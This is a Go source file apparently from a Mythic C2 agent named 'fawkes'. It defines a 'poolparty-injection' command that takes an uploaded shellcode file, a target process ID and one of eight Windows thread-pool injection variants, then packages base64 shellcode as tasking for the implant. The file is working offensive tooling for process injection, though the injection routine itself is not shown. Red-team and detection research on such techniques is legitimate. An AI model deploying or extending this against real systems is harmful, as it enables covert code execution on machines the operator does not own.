package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "poolparty-injection",
		Description:         "Perform PoolParty process injection using Windows Thread Pool abuse techniques. Based on SafeBreach Labs research.",
		HelpString:          "poolparty-injection",
		Version:             1,
		MitreAttackMappings: []string{"T1055"}, // Process Injection
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "variant",
				ModalDisplayName: "Injection Variant",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "The PoolParty injection variant to use",
				Choices: []string{
					"1 - Worker Factory Start Routine Overwrite",
					"2 - TP_WORK Insertion",
					"3 - TP_WAIT Insertion",
					"4 - TP_IO Insertion",
					"5 - TP_ALPC Insertion",
					"6 - TP_JOB Insertion",
					"7 - TP_DIRECT Insertion",
					"8 - TP_TIMER Insertion",
				},
				DefaultValue: "1 - Worker Factory Start Routine Overwrite",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "The shellcode file to inject from files already registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file to inject",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "pid",
				ModalDisplayName: "Target PID",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "The process ID to inject shellcode into",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     2,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     2,
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			// Get the variant selection
			variantStr, err := taskData.Args.GetStringArg("variant")
			if err != nil {
				logging.LogError(err, "Failed to get variant")
				response.Success = false
				response.Error = "Failed to get injection variant: " + err.Error()
				return response
			}

			// Parse variant number from string like "1 - Worker Factory..."
			var variant int
			if len(variantStr) > 0 {
				fmt.Sscanf(variantStr, "%d", &variant)
			}

			if variant < 1 || variant > 8 {
				response.Success = false
				response.Error = fmt.Sprintf("Invalid variant: %d. Supported variants: 1-8", variant)
				return response
			}

			// Resolve file contents by checking actual args (not ParameterGroupName)
			filename, fileContents, fErr := resolveFileContents(taskData)
			if fErr != nil {
				response.Success = false
				response.Error = fErr.Error()
				return response
			}

			// Get the target PID
			pid, err := taskData.Args.GetNumberArg("pid")
			if err != nil {
				logging.LogError(err, "Failed to get PID")
				response.Success = false
				response.Error = "Failed to get target PID: " + err.Error()
				return response
			}

			if pid <= 0 {
				response.Success = false
				response.Error = "Invalid PID specified (must be greater than 0)"
				return response
			}

			// Build variant description
			variantDesc := "Unknown"
			switch variant {
			case 1:
				variantDesc = "Worker Factory Start Routine Overwrite"
			case 2:
				variantDesc = "TP_WORK Insertion"
			case 3:
				variantDesc = "TP_WAIT Insertion"
			case 4:
				variantDesc = "TP_IO Insertion"
			case 5:
				variantDesc = "TP_ALPC Insertion"
			case 6:
				variantDesc = "TP_JOB Insertion"
			case 7:
				variantDesc = "TP_DIRECT Insertion"
			case 8:
				variantDesc = "TP_TIMER Insertion"
			}

			// Build the display parameters
			displayParams := fmt.Sprintf("Variant: %d (%s)\nShellcode: %s (%d bytes)\nTarget PID: %d",
				variant, variantDesc, filename, len(fileContents), int(pid))
			response.DisplayParams = &displayParams
			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("PoolParty variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, int(pid), len(fileContents)))

			// Build the actual parameters JSON that will be sent to the agent
			params := map[string]interface{}{
				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
				"pid":           int(pid),
				"variant":       variant,
			}

			paramsJSON, err := json.Marshal(params)
			if err != nil {
				logging.LogError(err, "Failed to marshal parameters")
				response.Success = false
				response.Error = "Failed to create task parameters: " + err.Error()
				return response
			}

			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
	})
}
